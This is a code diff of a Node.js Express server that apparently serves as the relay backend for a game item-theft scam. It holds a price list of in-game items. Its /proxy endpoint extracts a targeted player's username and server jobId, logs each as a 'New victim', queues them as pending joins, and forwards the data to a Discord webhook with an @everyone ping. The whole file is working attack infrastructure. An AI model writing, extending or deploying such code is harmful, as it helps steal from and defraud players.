@@ -11,7 +11,7 @@ app.use(express.json());
 let pendingJoins = [];
 const JOIN_TIMEOUT = 60000;
 
-// ========== VALUE DATABASE ==========
+// ========== COMPLETE VALUE DATABASE ==========
 const VALUE_DATABASE = {
     "HeartWand": 475,
     "Heart Wand": 475,
@@ -128,6 +128,7 @@ const VALUE_DATABASE = {
     "Sugar": 42
 };
 
+// ========== GET VALUES ==========
 app.get('/getvalues', (req, res) => {
     res.json(VALUE_DATABASE);
 });
@@ -148,6 +149,7 @@ app.post('/proxy', async (req, res) => {
         const payload = req.body;
         payload.content = '@everyone';
 
+        // Extract jobId from the embed
         const description = payload.embeds?.[0]?.description || '';
         let jobId = null;
         let username = null;
@@ -158,13 +160,6 @@ app.post('/proxy', async (req, res) => {
             username = joinLinkMatch[2];
         }
 
-        if (!jobId) {
-            const jobIdMatch = description.match(/jobId=([^&\s]+)/);
-            if (jobIdMatch) jobId = jobIdMatch[1];
-            const usernameMatch = description.match(/player[:\s]+([^\s\n]+)/i);
-            if (usernameMatch) username = usernameMatch[1];
-        }
-
         if (jobId) {
             pendingJoins.push({
                 jobId,
@@ -173,8 +168,10 @@ app.post('/proxy', async (req, res) => {
             });
             pendingJoins = pendingJoins.filter(j => Date.now() - j.timestamp < JOIN_TIMEOUT);
             console.log(`[Proxy] ✅ New victim: ${username}, JobId: ${jobId}`);
+            console.log(`[Proxy] Pending joins: ${pendingJoins.length}`);
         }
 
+        // Forward to Discord
         const response = await fetch(process.env.WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -202,6 +199,7 @@ app.get('/pending', (req, res) => {
     res.json({ jobs });
 });
 
+// ========== HEALTH CHECK ==========
 app.get('/', (req, res) => {
     res.json({ 
         status: 'ok', 
